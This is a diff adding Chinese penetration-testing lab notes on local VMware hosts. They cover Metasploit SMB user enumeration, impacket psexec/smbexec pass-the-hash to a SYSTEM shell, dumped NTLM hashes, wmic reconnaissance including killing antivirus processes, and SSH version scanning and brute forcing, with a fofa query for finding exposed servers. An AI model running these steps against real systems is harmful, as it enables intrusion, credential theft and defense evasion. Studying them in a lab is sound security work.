@@ -2298,8 +2298,1154 @@ rm 删除文件
 rmdir 删除文件夹
 
 
+使用msf的smb_lookupsid模块扫描系统用户的信息(SID枚举)
+也需要用户的账号和密码 这样可以获得用户名或者组名 这个模块适用于Windows和Samba
+
+先去windows那边创建一个用户
+┌──(root💀tyza66)-[~]
+└─# msfdb run                                                            
+[i] Database already started
+Metasploit tip: View advanced module options with advanced
+                                                  
+                          ########                  #
+                      #################            #
+                   ######################         #
+                  #########################      #
+                ############################
+               ##############################
+               ###############################
+              ###############################
+              ##############################
+                              #    ########   #
+                 ##        ###        ####   ##
+                                      ###   ###
+                                    ####   ###
+               ####          ##########   ####
+               #######################   ####
+                 ####################   ####
+                  ##################  ####
+                    ############      ##
+                       ########        ###
+                      #########        #####
+                    ############      ######
+                   ########      #########
+                     #####       ########
+                       ###       #########
+                      ######    ############
+                     #######################
+                     #   #   ###  #   #   ##
+                     ########################
+                      ##     ##   ##     ##
+                            https://metasploit.com
 
 
+       =[ metasploit v6.4.9-dev                           ]
++ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]
++ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search smb_look
+
+Matching Modules
+================
+
+   #  Name                                                   Disclosure Date  Rank    Check  Description
+   -  ----                                                   ---------------  ----    -----  -----------
+   0  auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli  .                normal  No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
+   1  auxiliary/admin/mssql/mssql_enum_domain_accounts       .                normal  No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
+   2  auxiliary/scanner/smb/smb_lookupsid                    .                normal  No     SMB SID User Enumeration (LookupSid)
+   3    \_ action: DOMAIN                                    .                .       .      Enumerate domain accounts
+   4    \_ action: LOCAL                                     .                .       .      Enumerate local accounts
+
+
+Interact with a module by name or index. For example info 4, use 4 or use auxiliary/scanner/smb/smb_lookupsid                                             
+After interacting with a module you can manually set a ACTION with set ACTION 'LOCAL'                                                                     
+
+msf6 > use 2
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+msf6 auxiliary(scanner/smb/smb_lookupsid) > options
+
+Module options (auxiliary/scanner/smb/smb_lookupsid):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   MaxRID  4000             no        Maximum RID to check
+   MinRID  500              no        Starting RID to check
+
+
+   Used when making a new connection via RHOSTS:
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   RHOSTS                      no        The target host(s), see https://do
+                                         cs.metasploit.com/docs/using-metas
+                                         ploit/basics/using-metasploit.html
+   SMBDomain  .                no        The Windows domain to use for auth
+                                         entication
+   SMBPass                     no        The password for the specified use
+                                         rname
+   SMBUser                     no        The username to authenticate as
+   THREADS    1                yes       The number of concurrent threads (
+                                         max one per host)
+
+
+   Used when connecting via an existing SESSION:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   no        The session to run this module on
+
+
+Auxiliary action:
+
+   Name   Description
+   ----   -----------
+   LOCAL  Enumerate local accounts
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/smb/smb_lookupsid) > set RHOSTS 192.168.101.111
+RHOSTS => 192.168.101.111
+msf6 auxiliary(scanner/smb/smb_lookupsid) > run
+
+[*] 192.168.101.111: - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/smb/smb_lookupsid) > set SMBUSER tyza66
+SMBUSER => tyza66
+msf6 auxiliary(scanner/smb/smb_lookupsid) > set SMBPASS 123456
+SMBPASS => 123456
+msf6 auxiliary(scanner/smb/smb_lookupsid) > run
+
+[*] 192.168.101.111:445 - PIPE(LSARPC) LOCAL(DESKTOP-ASI6V22 - 5-21-815478987-2258583051-490571120) DOMAIN(WORKGROUP - )
+[*] 192.168.101.111:445 - USER=Administrator RID=500
+[*] 192.168.101.111:445 - USER=Guest RID=501
+[*] 192.168.101.111:445 - USER=DefaultAccount RID=503
+[*] 192.168.101.111:445 - USER=WDAGUtilityAccount RID=504
+[*] 192.168.101.111:445 - GROUP=None RID=513
+[*] 192.168.101.111:445 - USER=tyza66 RID=1000
+[*] 192.168.101.111:445 - USER=admin RID=1001
+[*] 192.168.101.111:445 - USER=newuser RID=1002
+^C[*] 192.168.101.111: - Caught interrupt from the console...
+[*] Auxiliary module execution completed
+
+而且这个我们用来搜索的账号可以不是管理员 用任何的用户的账密都可以收集到
+得到密码之后可以进行弱口令检查
+
+接下来看一下使用impacket-psexec 连接目标主机获得共享文件和用户信息
+比如我们获得目标机的密码的哈希值但是不知道密码也可以直接连接上
+sysinternals 版本下载地址：https://download.sysinternals.com/files/PSTools.zip
+原理是通过文件共享上传二进制到C:/Windows目录
+之后创建一个服务
+通过服务运行二进制文件
+结束后会删除服务和二进制文件
+总的来说用户要开启445端口和非IPC$的任意可写共享目录(为了文件上传)
+使用明文连接
+impacket-psexec tyza66:123456@192.168.101.111 -codec gbk
+
+┌──(root💀tyza66)-[~]
+└─# impacket-psexec tyza66:123456@192.168.101.111 -codec gbk
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Requesting shares on 192.168.101.111.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+[*] Found writable share Share
+[*] Uploading file WFdVTNoS.exe
+[*] Opening SVCManager on 192.168.101.111.....
+[-] Error opening SVCManager on 192.168.101.111.....
+[-] Error performing the installation, cleaning up: Unable to open SVCManager
+                                                                                        
+┌──(root💀tyza66)-[~]
+└─# impacket-psexec tyza66:123456@192.168.101.111 -codec gbk
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Requesting shares on 192.168.101.111.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+[*] Found writable share Share
+[*] Uploading file qPnGbDZt.exe
+[*] Opening SVCManager on 192.168.101.111.....
+[-] Error opening SVCManager on 192.168.101.111.....
+[-] Error performing the installation, cleaning up: Unable to open SVCManager
+                                                                                        
+┌──(root💀tyza66)-[~]
+└─# impacket-psexec administrator@192.168.101.111 -codec gbk
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+Password:
+[-] SMB SessionError: code: 0xc000006d - STATUS_LOGON_FAILURE - The attempted logon is invalid. This is either due to a bad username or authentication information.
+                                                                                        
+┌──(root💀tyza66)-[~]
+└─# impacket-psexec administrator@192.168.101.111 -codec gbk
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+Password:
+[-] SMB SessionError: code: 0xc0000072 - STATUS_ACCOUNT_DISABLED - The referenced account is currently disabled and may not be logged on to.
+                                                                                        
+┌──(root💀tyza66)-[~]
+└─# impacket-psexec administrator:@192.168.101.111 -codec gbk
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+Password:
+[-] SMB SessionError: code: 0xc0000072 - STATUS_ACCOUNT_DISABLED - The referenced account is currently disabled and may not be logged on to.
+                                                                                        
+┌──(root💀tyza66)-[~]
+└─# impacket-psexec administrator:1@192.168.101.111 -codec gbk
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[-] SMB SessionError: code: 0xc000006d - STATUS_LOGON_FAILURE - The attempted logon is invalid. This is either due to a bad username or authentication information.
+                                                                                        
+┌──(root💀tyza66)-[~]
+└─# impacket-psexec administrator:.@192.168.101.111 -codec gbk
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[-] SMB SessionError: code: 0xc000006d - STATUS_LOGON_FAILURE - The attempted logon is invalid. This is either due to a bad username or authentication information.
+                                                                                        
+┌──(root💀tyza66)-[~]
+└─# impacket-psexec administrator:LINGSHI.15@192.168.101.111 -codec gbk
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[-] SMB SessionError: code: 0xc000006d - STATUS_LOGON_FAILURE - The attempted logon is invalid. This is either due to a bad username or authentication information.
+                                                                                        
+┌──(root💀tyza66)-[~]
+└─# impacket-psexec tyza66:123456@192.168.101.111 -codec gbk         
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Requesting shares on 192.168.101.111.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+[*] Found writable share Share
+[*] Uploading file SlOBOUiD.exe
+[*] Opening SVCManager on 192.168.101.111.....
+[-] Error opening SVCManager on 192.168.101.111.....
+[-] Error performing the installation, cleaning up: Unable to open SVCManager
+                                                                                        
+┌──(root💀tyza66)-[~]
+└─# impacket-psexec tyza66:123456@192.168.101.111 -codec gbk
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Requesting shares on 192.168.101.111.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+[*] Found writable share Share
+[*] Uploading file XhIWQdfl.exe
+[*] Opening SVCManager on 192.168.101.111.....
+[-] Error opening SVCManager on 192.168.101.111.....
+[-] Error performing the installation, cleaning up: Unable to open SVCManager
+                                                                                        
+┌──(root💀tyza66)-[~]
+└─# impacket-psexec tyza66:123456@192.168.101.111 -codec gbk
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Requesting shares on 192.168.101.111.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+[*] Found writable share Share
+[*] Uploading file QRVyhnjj.exe
+[*] Opening SVCManager on 192.168.101.111.....
+[-] Error opening SVCManager on 192.168.101.111.....
+[-] Error performing the installation, cleaning up: Unable to open SVCManager
+
+这里我的用户没权限 接下来用哈希值直接连吧
+209c6174da490caeb422f3fa5a7ae634
+impacket-psexec admin@192.168.101.111 -hashes :209c6174da490caeb422f3fa5a7ae634 -codec gbk
+
+连我自己都不知道密码的也可以连接
+
+──(root💀tyza66)-[~]
+└─# impacket-psexec admin@192.168.101.111 -hashes :209c6174da490caeb422f3fa5a7ae634 -codec gbk
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Requesting shares on 192.168.101.111.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+[-] share 'Share' is not writable.
+[-] share 'Users' is not writable.
+
+还是用户问题 所以我重新用administrator连一下
+impacket-psexec administrator:123456@192.168.101.111 -codec gbk
+┌──(root💀tyza66)-[~]
+└─# impacket-psexec administrator:123456@192.168.101.111 -codec gbk
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Requesting shares on 192.168.101.111.....
+[*] Found writable share ADMIN$
+[*] Uploading file mpWxLDzZ.exe
+[*] Opening SVCManager on 192.168.101.111.....
+[*] Creating service DqlT on 192.168.101.111.....
+[*] Starting service DqlT.....
+[!] Press help for extra shell commands
+Microsoft Windows [版本 10.0.18362.476]
+(c) 2019 Microsoft Corporation。保留所有权利。
+
+C:\Windows\system32> 
+C:\Windows\system32> exit
+[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 9009
+[*] Opening SVCManager on 192.168.101.111.....
+[*] Stopping service DqlT.....
+[*] Removing service DqlT.....
+[*] Removing file mpWxLDzZ.exe.....
+
+再尝试用hash连接
+重新获得哈希
+meterpreter > hashdump
+admin:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+newuser:1002:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
+tyza66:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:83cdde6544e3feb235d3cfdc61104914:::
+
+mpacket-psexec administrator@192.168.101.111 -hashes :32ed87bdb5fdc5e9cba88547376818d4 -codec gbk
+
+┌──(root💀tyza66)-[~]
+└─# impacket-psexec administrator@192.168.101.111 -hashes :32ed87bdb5fdc5e9cba88547376818d4 -codec gbk
+
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Requesting shares on 192.168.101.111.....
+[*] Found writable share ADMIN$
+[*] Uploading file RgXCbYfN.exe
+[*] Opening SVCManager on 192.168.101.111.....
+[*] Creating service qPAj on 192.168.101.111.....
+[*] Starting service qPAj.....
+[!] Press help for extra shell commands
+Microsoft Windows [版本 10.0.18362.476]
+(c) 2019 Microsoft Corporation。保留所有权利。
+
+C:\Windows\system32> 
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> cls
+ 
+
+C:\Windows\system32> net share
+ 
+共享名       资源                            注解
+
+-------------------------------------------------------------------------------
+C$           C:\                             默认共享                          
+IPC$                                         远程 IPC                          
+ADMIN$       C:\Windows                      远程管理                          
+Share        C:\Share                        
+Users        C:\Users                        
+命令成功完成。
+
+
+C:\Windows\system32> systeminfo
+ 
+主机名:           DESKTOP-ASI6V22
+OS 名称:          Microsoft Windows 10 教育版
+OS 版本:          10.0.18362 暂缺 Build 18362
+OS 制造商:        Microsoft Corporation
+OS 配置:          独立工作站
+OS 构建类型:      Multiprocessor Free
+注册的所有人:     Windows 用户
+注册的组织:       
+产品 ID:          00328-00000-00000-AA873
+初始安装日期:     2025/2/16, 16:56:56
+系统启动时间:     2025/2/17, 12:28:41
+系统制造商:       VMware, Inc.
+系统型号:         VMware20,1
+系统类型:         x64-based PC
+处理器:           安装了 2 个处理器。
+                  [01]: Intel64 Family 6 Model 165 Stepping 2 GenuineIntel ~2304 Mhz
+                  [02]: Intel64 Family 6 Model 165 Stepping 2 GenuineIntel ~2304 Mhz
+BIOS 版本:        VMware, Inc. VMW201.00V.24006586.B64.2406042154, 2024/6/4
+Windows 目录:     C:\Windows
+系统目录:         C:\Windows\system32
+启动设备:         \Device\HarddiskVolume1
+系统区域设置:     zh-cn;中文(中国)
+输入法区域设置:   zh-cn;中文(中国)
+时区:             (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐
+物理内存总量:     4,095 MB
+可用的物理内存:   2,286 MB
+虚拟内存: 最大值: 5,503 MB
+虚拟内存: 可用:   3,811 MB
+虚拟内存: 使用中: 1,692 MB
+页面文件位置:     C:\pagefile.sys
+域:               WORKGROUP
+登录服务器:       暂缺
+修补程序:         安装了 5 个修补程序。
+                  [01]: KB4515871
+                  [02]: KB4513661
+                  [03]: KB4516115
+                  [04]: KB4524569
+                  [05]: KB4524570
+网卡:             安装了 1 个 NIC。
+                  [01]: Intel(R) 82574L Gigabit Network Connection
+                      连接名:      Ethernet0
+                      启用 DHCP:   否
+                      IP 地址
+                        [01]: 192.168.101.111
+                        [02]: fe80::9851:508c:3d62:fdce
+Hyper-V 要求:     已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。
+
+C:\Windows\system32> 
+
+这里有一个有力的工具wmic 它是windows管理规范 覆盖面很广
+C:\Windows\system32> wmic share get name,path,status
+Name    Path        Status  
+ADMIN$  C:\Windows  OK      
+C$      C:\         OK      
+IPC$                OK      
+Share   C:\Share    OK      
+Users   C:\Users    OK      
+
+通过 wmic 收集内网主机信息
+#登录用户
+wmic logon list brief
+#域控机器
+wmic ntdomain list brief
+#用户列表
+wmic useraccount list brief
+#查看系统共享
+wmic share get name,path
+#服务列表
+wmic service list brief | more
+#识别开机启动的程序，包括路径
+wmic startup list full
+#查看系统中开启的日志
+wmic nteventlog get path,filename,writeable
+#查看系统中网卡的 IP 地址和 MAC 地址
+wmic nicconfig get ipaddress,macaddress
+#使用 wmic 识别安装到系统中的补丁情况
+wmic qfe get description,installedOn
+#查看系统中安装的软件以及版本，2008R2 上执行后无反应。
+wmic product get name,version
+#更改当前用户名
+wmic useraccount where "name='%UserName%'" call rename newUserName
+#查看当前系统是否是 VMware，可以按照实际情况进行筛选
+wmic bios list full | findstr /i "vmware"
+#查看当前系统是否有屏保保护，延迟是多少
+wmic desktop get screensaversecure,screensavertimeout
+#获取指定进程可执行文件的路径
+wmic process where name="vmtoolsd.exe" get executablepath
+#获取 temp 环境变量
+wmic environment where "name='temp'" get UserName,VariableValue
+#查询当前主机的杀毒软件
+wmic process where "name like '%forti%'" get name
+wmic process where name="FortiTray.exe" call terminate
+wmic /namespace:\\root\securitycenter2 path antivirusproduct GET
+displayName,productState,pathToSignedProductExe
+#查询 windows 机器版本和服务位数和.net 版本
+wmic os get caption
+wmic os get osarchitecture
+wmic OS get Caption,CSDVersion,OSArchitecture,Version
+wmic product where "Name like 'Microsoft .Net%'" get Name, Version
+#查询本机所有盘符
+wmic logicaldisk list brief
+wmic logicaldisk get description,name,size,freespace /value
+查看某个进程的详细信息 （路径，命令行参数等）
+wmic process where name="chrome.exe" list full
+wmic process where name="frp.exe" get executablepath,name,ProcessId
+wmic process where caption="frp.exe" get caption,commandline /value
+查看某个进程的详细信息-PID
+wmic process list brief
+tasklist /SVC | findstr frp.exe
+wmic process where ProcessId=38104 get
+ParentProcessId,commandline,processid,executablepath,name,CreationClassName,Creation
+Date
+终止一个进程
+wmic process where name ="xshell.exe" call terminate
+taskkill -im pid
+获取电脑产品编号和型号信息
+wmic baseboard get Product,SerialNumber
+wmic bios get serialnumber
+
+net 也好用
+C:\Windows\system32> net user
+
+\\ 的用户帐户
+
+-------------------------------------------------------------------------------
+admin                    Administrator            DefaultAccount           
+Guest                    newuser                  tyza66                   
+WDAGUtilityAccount       
+命令运行完毕，但发生一个或多个错误。
+
+
+C:\Windows\system32>net localgroup administrators
+别名     administrators
+注释     管理员对计算机/域有不受限制的完全访问权
+
+成员
+
+-------------------------------------------------------------------------------
+admin
+Administrator
+tyza66
+命令成功完成。
+
+
+C:\Windows\system32> 
+
+
+除了上面的方法 还可以使用impacket-smbexec使用明文密码或者哈希值攻击目标主机获取信息
+
+原理不一样了 psexec会上传exe 而smb上传的是bat批处理文件和一个临时文来执行和转发消息
+
+和一个临时文件来执行和转发消息。
+明文密码连接
+└─# impacket-smbexec administrator:123456@192.168.101.111 -codec gbk -debug
+或 HASH 连接
+└─# impacket-smbexec administrator@192.168.101.111 -hashes :32ed87bdb5fdc5e9cba88547376818d4 -codec gbk -debug
+
+┌──(root💀tyza66)-[~]
+└─# impacket-smbexec administrator:123456@192.168.101.111 -codec gbk -debug
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
+[+] StringBinding ncacn_np:192.168.101.111[\pipe\svcctl]
+[+] Executing %COMSPEC% /Q /c echo cd  ^> \\%COMPUTERNAME%\C$\__output 2^>^&1 > %SYSTEMROOT%\tVFHQCVt.bat & %COMSPEC% /Q /c %SYSTEMROOT%\tVFHQCVt.bat & del %SYSTEMROOT%\tVFHQCVt.bat
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>
+!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>whoami
+[+] Executing %COMSPEC% /Q /c echo whoami ^> \\%COMPUTERNAME%\C$\__output 2^>^&1 > %SYSTEMROOT%\ZAhpxqzg.bat & %COMSPEC% /Q /c %SYSTEMROOT%\ZAhpxqzg.bat & del %SYSTEMROOT%\ZAhpxqzg.bat
+nt authority\system
+
+C:\Windows\system32>
+
+没执行一条都是创建一个bat之后执行之后再将bat文件删了
+
+
+之后再看一下SSH协议的信息收集
+开放ssh的不一定是linux
+┌──(root💀tyza66)-[~]
+└─# msfdb run
+[i] Database already started
+Metasploit tip: The use command supports fuzzy searching to try and 
+select the intended module, e.g. use kerberos/get_ticket or use 
+kerberos forge silver ticket
+                                                  
+# cowsay++
+ ____________                                                                           
+< metasploit >                                                                          
+ ------------                                                                           
+       \   ,__,                                                                         
+        \  (oo)____                                                                     
+           (__)    )\                                                                   
+              ||--|| *                                                                  
+                                                                                        
+
+       =[ metasploit v6.4.9-dev                           ]
++ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]
++ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search ssh_version
+
+Matching Modules
+================
+
+   #  Name                                       Disclosure Date  Rank    Check  Description
+   -  ----                                       ---------------  ----    -----  -----------
+   0  auxiliary/fuzzers/ssh/ssh_version_15       .                normal  No     SSH 1.5 Version Fuzzer
+   1  auxiliary/fuzzers/ssh/ssh_version_2        .                normal  No     SSH 2.0 Version Fuzzer
+   2  auxiliary/fuzzers/ssh/ssh_version_corrupt  .                normal  No     SSH Version Corruption
+   3  auxiliary/scanner/ssh/ssh_version          .                normal  No     SSH Version Scanner
+
+
+Interact with a module by name or index. For example info 3, use 3 or use auxiliary/scanner/ssh/ssh_version                                                                     
+
+msf6 > use 3
+msf6 auxiliary(scanner/ssh/ssh_version) > options
+
+Module options (auxiliary/scanner/ssh/ssh_version):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   EXTENDED_CHECKS  true             yes       Check for cryptographic issues
+   RHOSTS                            yes       The target host(s), see https://docs.me
+                                               tasploit.com/docs/using-metasploit/basi
+                                               cs/using-metasploit.html
+   RPORT            22               yes       The target port
+   THREADS          1                yes       The number of concurrent threads (max o
+                                               ne per host)
+   TIMEOUT          30               yes       Timeout for the SSH probe
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 192.168.101.111
+RHOSTS => 192.168.101.111
+msf6 auxiliary(scanner/ssh/ssh_version) > run
+^C
+[*] Caught interrupt from the console...
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 192.168.101.180
+RHOSTS => 192.168.101.180
+msf6 auxiliary(scanner/ssh/ssh_version) > run
+
+[*] 192.168.101.180 - Key Fingerprint: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGnTNWyunssDVqb3w9GGBT672JYX2FGIIeoidxxYrGxS
+[*] 192.168.101.180 - SSH server version: SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13
+[*] 192.168.101.180 - Server Information and Encryption
+=================================
+
+  Type                     Value                                 Note
+  ----                     -----                                 ----
+  encryption.compression   none
+  encryption.compression   zlib@openssh.com
+  encryption.encryption    aes128-ctr
+  encryption.encryption    aes192-ctr
+  encryption.encryption    aes256-ctr
+  encryption.encryption    arcfour256                            Deprecated
+  encryption.encryption    arcfour128                            Deprecated
+  encryption.encryption    aes128-gcm@openssh.com
+  encryption.encryption    aes256-gcm@openssh.com
+  encryption.encryption    chacha20-poly1305@openssh.com
+  encryption.encryption    aes128-cbc                            Deprecated
+  encryption.encryption    3des-cbc                              Deprecated
+  encryption.encryption    blowfish-cbc                          Deprecated
+  encryption.encryption    cast128-cbc                           Deprecated
+  encryption.encryption    aes192-cbc                            Deprecated
+  encryption.encryption    aes256-cbc                            Deprecated
+  encryption.encryption    arcfour                               Deprecated
+  encryption.encryption    rijndael-cbc@lysator.liu.se           Deprecated
+  encryption.hmac          hmac-md5-etm@openssh.com
+  encryption.hmac          hmac-sha1-etm@openssh.com
+  encryption.hmac          umac-64-etm@openssh.com
+  encryption.hmac          umac-128-etm@openssh.com
+  encryption.hmac          hmac-sha2-256-etm@openssh.com
+  encryption.hmac          hmac-sha2-512-etm@openssh.com
+  encryption.hmac          hmac-ripemd160-etm@openssh.com
+  encryption.hmac          hmac-sha1-96-etm@openssh.com
+  encryption.hmac          hmac-md5-96-etm@openssh.com
+  encryption.hmac          hmac-md5                              Deprecated
+  encryption.hmac          hmac-sha1
+  encryption.hmac          umac-64@openssh.com
+  encryption.hmac          umac-128@openssh.com
+  encryption.hmac          hmac-sha2-256
+  encryption.hmac          hmac-sha2-512
+  encryption.hmac          hmac-ripemd160                        Deprecated
+  encryption.hmac          hmac-ripemd160@openssh.com
+  encryption.hmac          hmac-sha1-96                          Deprecated
+  encryption.hmac          hmac-md5-96                           Deprecated
+  encryption.host_key      ssh-rsa
+  encryption.host_key      ssh-dss
+  encryption.host_key      ecdsa-sha2-nistp256                   Weak elliptic curve
+  encryption.host_key      ssh-ed25519
+  encryption.key_exchange  curve25519-sha256@libssh.org
+  encryption.key_exchange  ecdh-sha2-nistp256
+  encryption.key_exchange  ecdh-sha2-nistp384
+  encryption.key_exchange  ecdh-sha2-nistp521
+  encryption.key_exchange  diffie-hellman-group-exchange-sha256
+  encryption.key_exchange  diffie-hellman-group-exchange-sha1    Deprecated
+  encryption.key_exchange  diffie-hellman-group14-sha1
+  encryption.key_exchange  diffie-hellman-group1-sha1            Deprecated
+  fingerprint_db           ssh.banner
+  openssh.comment          Ubuntu-2ubuntu2.13
+  os.cpe23                 cpe:/o:canonical:ubuntu_linux:14.04
+  os.family                Linux
+  os.product               Linux
+  os.vendor                Ubuntu
+  os.version               14.04
+  service.cpe23            cpe:/a:openbsd:openssh:6.6.1p1
+  service.family           OpenSSH
+  service.product          OpenSSH
+  service.protocol         ssh
+  service.vendor           OpenBSD
+  service.version          6.6.1p1
+
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ssh/ssh_version) > 
+
+这样就可以得到版本为SSH-2.0-OpenSSH_6.6.1p1
+
+搜一下有什么漏洞
+┌──(root💀tyza66)-[~]
+└─# searchsploit OpenSSH 6.6                          
+------------------------------------------------------ ---------------------------------
+ Exploit Title                                        |  Path
+------------------------------------------------------ ---------------------------------
+OpenSSH 2.3 < 7.7 - Username Enumeration              | linux/remote/45233.py
+OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)        | linux/remote/45210.py
+OpenSSH < 6.6 SFTP (x64) - Command Execution          | linux_x86-64/remote/45000.c
+OpenSSH < 6.6 SFTP - Command Execution                | linux/remote/45001.py
+OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' For | linux/local/40962.txt
+OpenSSH < 7.4 - agent Protocol Arbitrary Library Load | linux/remote/40963.txt
+OpenSSH < 7.7 - User Enumeration (2)                  | linux/remote/45939.py
+------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+
+发现存在用户名枚举漏洞
+存在用户名枚举就可以爆破用户名
+可用fofa语法搜索port="22" banner="OpenSSH_6.6" 搜索到很多服务器
+先解决这个问题就升级版本
+很多生产环境都禁止了root登录 所以需要跑破用户名 之后再爆破密码
+
+接下来就进行一下暴力破解 有的服务器密码次数没有限制 所以可以用工具
+我们要使用kali自带的账密文件 所以咱们先给账密放进去
+vim /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+vagrant vagrant
+root 123456
+
+searcmsf6 > search ssh_login
+
+Matching Modules
+================
+
+   #  Name                                    Disclosure Date  Rank    Check  Description
+   -  ----                                    ---------------  ----    -----  -----------
+   0  auxiliary/scanner/ssh/ssh_login         .                normal  No     SSH Login Check Scanner
+   1  auxiliary/scanner/ssh/ssh_login_pubkey  .                normal  No     SSH Public Key Login Scanner
+
+
+Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssh/ssh_login_pubkey                                                                
+
+msf6 > use 0
+msf6 auxiliary(scanner/ssh/ssh_login) > show options
+
+Module options (auxiliary/scanner/ssh/ssh_login):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank username
+                                                 and password
+   BLANK_PASSWORDS   false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
+   CreateSession     true             no        Create a new session for every success
+                                                ful login
+   DB_ALL_CREDS      false            no        Try each user/password couple stored i
+                                                n the current database
+   DB_ALL_PASS       false            no        Add all passwords in the current datab
+                                                ase to the list
+   DB_ALL_USERS      false            no        Add all users in the current database
+                                                to the list
+   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in th
+                                                e current database (Accepted: none, us
+                                                er, user&realm)
+   PASSWORD                           no        A specific password to authenticate wi
+                                                th
+   PASS_FILE                          no        File containing passwords, one per lin
+                                                e
+   RHOSTS                             yes       The target host(s), see https://docs.m
+                                                etasploit.com/docs/using-metasploit/ba
+                                                sics/using-metasploit.html
+   RPORT             22               yes       The target port
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works
+                                                for a host
+   THREADS           1                yes       The number of concurrent threads (max
+                                                one per host)
+   USERNAME                           no        A specific username to authenticate as
+   USERPASS_FILE                      no        File containing users and passwords se
+                                                parated by space, one pair per line
+   USER_AS_PASS      false            no        Try the username as the password for a
+                                                ll users
+   USER_FILE                          no        File containing usernames, one per lin
+                                                e
+   VERBOSE           false            yes       Whether to print output for all attemp
+                                                ts
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.101.111
+RHOSTS => 192.168.101.111
+msf6 auxiliary(scanner/ssh/ssh_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+USERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+msf6 auxiliary(scanner/ssh/ssh_login) > run
+
+[*] 192.168.101.111:22 - Starting bruteforce
+^C[*] Caught interrupt from the console...
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.101.180
+RHOSTS => 192.168.101.180
+msf6 auxiliary(scanner/ssh/ssh_login) > run
+
+[*] 192.168.101.180:22 - Starting bruteforce
